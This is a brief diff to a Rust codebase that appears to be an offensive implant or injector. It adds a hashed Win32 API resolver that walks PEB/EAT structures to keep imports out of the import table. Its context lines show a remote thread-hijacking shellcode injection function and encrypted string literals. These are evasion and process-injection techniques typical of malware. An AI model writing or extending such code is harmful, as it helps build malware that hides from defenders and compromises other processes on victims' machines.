@@ -8,6 +8,12 @@ pub mod linux;
 #[cfg(target_os = "windows")]
 pub mod windows;
 
+// Lazy Win32 API resolver (import-table hygiene). Declared via #[path] so
+// the hash fn and its unit tests compile on every target while the PEB/EAT
+// machinery stays Windows-only inside the module.
+#[path = "windows/resolve.rs"]
+pub mod win_resolve;
+
 /// 1. Remote Injection (Thread Hijacking)
 pub fn inject_remote_hijack(pid: u32, shellcode: &[u8]) -> Result<String, String> {
     if shellcode.is_empty() { return Err(aes_str!("Shellcode is empty")); }
